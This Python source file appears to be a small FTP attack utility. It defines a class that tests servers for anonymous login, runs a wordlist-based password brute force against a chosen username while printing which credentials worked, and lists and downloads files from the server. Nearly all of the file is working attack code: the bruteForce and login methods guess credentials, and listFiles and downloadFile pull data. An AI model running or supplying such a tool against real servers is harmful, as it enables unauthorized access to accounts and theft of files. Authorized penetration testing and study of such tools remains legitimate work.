from ftplib import FTP
import os
import sys

###### make it faster
# list files
# check for write permission
## add upload/download file/s option

class ftpThings:
	def __init__(self):
		pass

	def checkAnonymousLogin(self, host, port):
		try:
			ftp = FTP()
			ftp.connect(host, port)
			ftp.login()
			ftp.quit()
			return True
		except:
			return False

	def login(self, host, port, username, password):
		try:
			ftp = FTP(host)
			ftp.login(username, password)
			ftp.quit()
			print(" "*int(os.get_terminal_size()[0] - 1), end="\r")
			print(f"username: {username}, password: {password} worked")

			return username, password
			# if worked, username & password creds are true
		except:
			# creds are wrong
			print(" "*int(os.get_terminal_size()[0] - 1), end="\r")
			print(f"username: {username}, password: {password} not worked", end="\r")
			pass

	def bruteForce(self, host, port, username, wordlistFile):
		try:
			with open(wordlistFile) as handle:
				words = handle.read().split("\n")
				for word in words:
					word = word.strip()
					result = self.login(host, port, username, word)
					if result:
						return result
		except Exception as e:
			print(e)

	def downloadFile(self, host, port, path, filename, username='', password=''):
		ftp = FTP()
		ftp.connect(host, port)

		if username and password:
			ftp.login(username, password)
		else:
			ftp.login()

		try:
			os.mkdir(str(os.getcwd()) + "/files/ftpFiles/")
		except:
			# folder exists or there is a problem :/
			pass

		handle = open(str(os.getcwd()) + "/files/ftpFiles/" + filename, "wb")
		ftp.retrbinary("RETR " + path + filename, handle.write)

		ftp.quit()

	def listFiles(self, host, port, foldername='', username='', password=''):
		ftp = FTP()
		ftp.connect(host, port)

		if username and password:
			ftp.login(username, password)
		else:
			ftp.login()

		if foldername:
			path = foldername
		else:
			path = ftp.pwd()

		files = ftp.nlst(path)
		if files:
			for file in files:
				pathWithFile = ftp.nlst(path + file)
				if int(len(pathWithFile)) == 1 and pathWithFile[0] == file:
					print(f"file found -> {file}")
					answer = input(f"download? (Y/y)")
					if answer == "Y" or answer == "y":
						self.downloadFile(host, port, path, file, username, password)
				else:
					print(f"folder found -> {file}")
		else:
			print("no file found")